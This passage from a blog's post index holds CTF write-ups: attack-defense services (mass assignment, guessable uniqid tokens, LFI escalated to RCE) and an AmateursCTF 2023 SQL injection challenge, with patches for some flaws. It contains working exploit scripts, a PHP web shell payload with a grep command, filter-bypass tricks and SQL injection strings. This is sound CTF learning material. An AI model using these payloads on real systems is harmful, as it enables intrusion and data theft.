data={&quot;username&quot;:username,&quot;password&quot;:password,&quot;confirmPassword&quot;:password}) session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;send&quot;}) session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;accept&quot;}) friend_page = session.get(f&quot;http://{ip}:3000/profile/{FLAGID}&quot;).text pattern = r&#39;&amp;lt;div class=&quot;room&quot;&amp;gt;\\s*&amp;lt;h3&amp;gt;(.*?)&amp;lt;/h3&amp;gt;&#39; test = re.search(pattern,friend_page) roomid_tmp = test.group(1).encode(&#39;utf-8&#39;) roomid = hashlib.sha256(roomid_tmp).hexdigest() chatroom = session.get(f&quot;http://{ip}:3000/chatroom/{roomid}&quot;).text flag_regex = re.compile(&#39;ENO[A-Za-z0-9+/=]{48}&#39;) flags = flag_regex.findall(chatroom) for flag in set(flags): print(flag) except Exception as e: print(e)OldSchool - Mass AssignmentFor the Oldschool service we were able to update our user profile.Here is the function:function updateProfile($userId, $profileData){ $dbh = DB::getInstance(); $sql = &#39;UPDATE users SET &#39;; $params = []; $first = true; foreach ($profileData as $key =&amp;gt; $value) { if (!$first) { $sql .= &#39;, &#39;; } else { $first = false; } $sql .= $key . &#39; = :&#39; . $key; $params[&#39;:&#39; . $key] = $value; } $sql .= &#39; WHERE id = :userId&#39;; $params[&#39;:userId&#39;] = $userId; if (isset($params[&#39;:password&#39;]) &amp;amp;&amp;amp; $params[&#39;:password&#39;] != &#39;&#39;) { $params[&#39;:password&#39;] = password_hash($params[&#39;:password&#39;], PASSWORD_DEFAULT); } $stmt = $dbh-&amp;gt;prepare($sql); $stmt-&amp;gt;execute($params);}When the function is called it gets passed the full $_POST array:updateProfile($_SESSION[&#39;user&#39;][&#39;id&#39;], $_POST);There is of course an SQLi in this function but it was easier to exploit the mass assignment for the same flag.The mass assignment is also harder to patch.Mass assignment vulnerabilities occurs when an application allows us to specify what fields to update without any constraints - in this case admin_of is something we shouldnt be allowed to change.To exploit this we register an account, submit a post request with admin_of=123 where 123 is given to use in the attack json.Then we can view the profile of the user given in the attack json which has a flag for us to take.#!/usr/bin/python3import requestsimport randomimport stringimport reimport jsonfrom sys import argvimport osletters = string.ascii_lowercase#script,ip = argvip = os.getenv(&#39;TARGET_IP&#39;)extra = json.loads(os.getenv(&#39;TARGET_EXTRA&#39;))session = requests.Session()headers = {&#39;User-Agent&#39;:&#39;python-httpx/0.23.3&#39;} # user agent of the flag checker (afaik)flag_regex = re.compile(r&#39;ENO[A-Za-z0-9+/=]{48}&#39;)def rand_string(num): return &#39;&#39;.join(random.choice(letters) for i in range(num))username = rand_string(10)password = rand_string(10)session.post(f&quot;http://{ip}:9080/index.php?action=register&quot;,data={&quot;username&quot;:username,&quot;password&quot;:password},headers=headers)for x in extra.keys(): extra_txt = extra[x][&#39;0&#39;][0] course_id = extra_txt.split(&#39; &#39;)[-1] user_id = extra_txt.split(&#39; &#39;)[3] session.post(f&quot;http://{ip}:9080/index.php?action=profile&quot;, data={&quot;aDmIn_oF&quot;:course_id}) # mixed case to bypass weak filters page = session.get(f&quot;http://{ip}:9080/index.php?action=profile&amp;amp;id={user_id}&quot;).text flags = set(flag_regex.findall(page)) for flag in flags: print(flag)BollwerkVuln 1 - Bruteforcable TokensThe first vuln we found was with how the app handles support tickets/complaints. When creating a complaint, its stored through a b64 token of your username, ‘_’ for padding and the first 8 chars of uniqid()#app/Controller/SupportController.php:38 private function generateToken(string $username): string { return base64_encode(sprintf(&quot;%-&#39;_21s%.8s&quot;, $username, uniqid())); }Uniqid reutrns a “unique” identifier based on the current time in microseconds. But since its only using the first 8 bytes. It’s not that unique, with only the last 1 or 2 bytes being different. So you can brute force the ID with relative ease.php &amp;gt; echo sprintf(&quot;%.8s&quot;, uniqid());# 64c1709ephp &amp;gt; echo sprintf(&quot;%.8s&quot;, uniqid());# 64c1709fphp &amp;gt; echo sprintf(&quot;%.8s&quot;, uniqid());# 64c170a0Looking at /support-disclaimer of the web app will reveal all current complains. This includes the username and the time that the complaint was made. Using the two of these you can quickly generate the valid tokens and get the flag.PatchOur patch for this was to just replace uniqid with random_bytes() so the bytes are actually unique.#app/Controller/SupportController.php:38private function generateToken(string $username): string { return base64_encode(sprintf(&quot;%-&#39;_21s%.8s&quot;, $username, bin2hex(random_bytes(10)) )); }We also stripped the submission date from the /support-disclaimer page to make getting the exact submission time harder to get.Vuln 2 - LFIThe second vuln found was intended as LFI by calling on the $viewPath variable, but we were able to get RCE.$viewPath is inside the function render which is used to render a view file and return its contents as a response object. When the $viewPath variable is used in your request, the contents of the file being viewed and can be rendered.#app/Http/View.php:18public static function render(string $view, array $parameters = []): Response { ob_start(); $viewPath = &quot;View/$view.php&quot;; extract([...static::createGlobals(), ...$parameters]); require(resolvePath($viewPath)); return Response::create((string)ob_get_clean()); }The resolvePath function is used to get the path of the file to be rendered. However, its limited to these directoriesconst ALLOW_LIST = [&#39;files&#39;,&#39;public&#39;,&#39;View&#39;,];With all of this, we can now view any files that are in the directories listed in ALLOW_LIST. We know that when a user creates a recipe, the file is stored in a directory that is the md5 hash of the users username.public function createRecipe(array $data): Recipe{$directory = resolvePath(&#39;files/&#39; . md5($this-&amp;gt;request-&amp;gt;session-&amp;gt;getUser()-&amp;gt;username), checkFileExistence: false);...The attack.json file gives us both the username and recipe title for all the flags for the tick. So we can then view any files by sending viewPath=files/{MD5 of username}/{filename}.md as a cookie in a GET request.RCEFrom looking in the tulip logs we seen that one team was able to load their own recipes with PHP code in order to get RCE. We were able to replicate it by creating a recipe with this as the recipes description&amp;lt;?php system($_GET[&#39;rce&#39;]);?&amp;gt;Once we called our recipe, we can give a url parameter ?rce=grep+-ERho+&#39;ENO%5BA-Za-z0-9+%5C/=%5D%7B48%7D&#39;+/var/www/html/files to read all files matching the flag regex.PatchOur patch for this was fairly simple. We just added a salt of ‘irelandwithoutre’ to the md5 of the username for the directory name.```phppublic function createRecipe(array $data): Recipe{$directory = resolvePath(‘files/’ . md5($this-&amp;gt;request-&amp;gt;session-&amp;gt;getUser()-&amp;gt;username . ‘irelandwithoutre’), checkFileExistence: false);…" }, { "title": "AmateursCTF 2023", "url": "/posts/AmateursCTF/", "categories": "Jeopardy", "tags": "ctf, web, sqli", "date": "2023-07-20 00:00:00 +0000", "snippet": "cps remasteredThe description is already hinting at SQL injection so we know what we’re getting into hereIt didnt take too long to spot the SQLi in register.php&amp;lt;?php $message = &quot;&quot;; mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); if (isset($_POST[&quot;username&quot;]) &amp;amp;&amp;amp; isset($_POST[&quot;password&quot;])) { try{ $mysqli = new mysqli(&quot;p:db&quot;, &quot;app&quot;, &quot;ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5&quot;, &quot;cps&quot;); $result = $mysqli-&amp;gt;query(sprintf(&quot;INSERT INTO users (username, password) VALUES (&#39;%s&#39;, &#39;%s&#39;)&quot;, $_POST[&quot;username&quot;], $_POST[&quot;password&quot;])); if ($result) { $token = bin2hex(random_bytes(16)); $add_token = $mysqli-&amp;gt;query(sprintf(&quot;INSERT INTO tokens (token, username) VALUES (&#39;%s&#39;, &#39;%s&#39;)&quot;, $token, $_POST[&quot;username&quot;])); if ($add_token) { setcookie(&quot;token&quot;, $token); $message = &quot;&amp;lt;p&amp;gt;Successfully created account. You are now logged in&amp;lt;/p&amp;gt;&quot;; } } else { $message = &quot;&amp;lt;p&amp;gt;Something went wrong. Username &quot; + $_POST[&quot;username&quot;] + &quot; (might) have been taken already&amp;lt;/p&amp;gt;&quot;; } } catch (Exception $e) { if (str_starts_with($e, &quot;mysqli_sql_exception: Duplicate entry &#39;&quot;) and str_contains($e, &quot;&#39; for key &#39;PRIMARY&#39;&quot;)) { $message = sprintf(&quot;&amp;lt;p&amp;gt;Something went wrong. Username starting with %s has been taken already&amp;lt;/p&amp;gt;&quot;, substr(explode(&quot;&#39; for key&quot;, substr($e, 39))[0], 0, 5)); } } }?&amp;gt;I thought we could update password field using the insert query however the permissions for the SQL user only allow us to update the best_cps column.CREATE USER &#39;app&#39; @&#39;%&#39; IDENTIFIED BY &#39;ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5&#39;;GRANT SELECT ON cps.* TO &#39;app&#39; @&#39;%&#39;;GRANT INSERT ON cps.* TO &#39;app&#39; @&#39;%&#39;;GRANT UPDATE (best_cps) ON cps.users TO &#39;app&#39; @&#39;%&#39;;FLUSH PRIVILEGES;So instead let’s look at this other SQLi in login.php&amp;lt;?php $message = &quot;&quot;; mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); if (isset($_POST[&quot;username&quot;]) &amp;amp;&amp;amp; isset($_POST[&quot;password&quot;])) { $mysqli = new mysqli(&quot;p:db&quot;, &quot;app&quot;, &quot;ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5&quot;, &quot;cps&quot;); $stmt = $mysqli-&amp;gt;prepare(&quot;SELECT username, password FROM users WHERE username = ? AND password = ?&quot;); $stmt-&amp;gt;bind_param(&quot;ss&quot;, $_POST[&quot;username&quot;], $_POST[&quot;password&quot;]); $stmt-&amp;gt;execute(); $result = $stmt-&amp;gt;get_result(); $row = $result-&amp;gt;fetch_assoc(); if ($row) { $token = bin2hex(random_bytes(16)); $add_token = $mysqli-&amp;gt;query(sprintf(&quot;INSERT INTO tokens (token, username) VALUES (&#39;%s&#39;, &#39;%s&#39;)&quot;, $token, $_POST[&quot;username&quot;])); if ($add_token) { setcookie(&quot;token&quot;, $token); echo &quot;&amp;lt;p&amp;gt;You are now logged in&amp;lt;/p&amp;gt;&quot;; } } else { echo &quot;&amp;lt;p&amp;gt;Something went wrong.&amp;lt;/p&amp;gt;&quot;; } }?&amp;gt;On first glance it might seem like we can’t exploit the SQLi in the INSERT query however if we register an account with our payload as it’s username we can reach the vulnerable query.So register a user with the username admin\\&#39;);-- - - we need to escape the quote as register.php itself is injectable.Afterwards log in as the user we just created and we get the flag on the index (flag was password of admin user).What our injection does here is make the token we have the token for the admin user instead of the user we created.Flag: amateursCTF{h0w_f@st_can_you_cl1ck?}Other notes from cps remasteredThe intended solution was to extract the flag bit by bit using boolean based blind.If we did have UPDATE permissions for password column we could extract data through the password field in our INSERT query like this:Username: myuserPassword: xd&#39;),(&#39;myuser&#39;,&#39;derp&#39;) ON DUPLICATE KEY UPDATE password=@@version-- -Query:INSERT INTO users (username, password) VALUES (&#39;myuser&#39;, &#39;xd&#39;),(&#39;myuser&#39;,&#39;derp&#39;) ON DUPLICATE KEY UPDATE password=@@version-- -&#39;)While exploiting this you may get an error like:Error in query (1093): Table ‘users’ is specified twice, both as a target for ‘INSERT’ and as a separate source for dataYou can work around this issue using subqueries:xd&#39;),(&#39;myuser&#39;,&#39;derp&#39;) ON DUPLICATE KEY UPDATE password=(SELECT t.password FROM (SELECT * FROM users t WHERE t.username=&#39;admin&#39;) as t)-- -" } ]
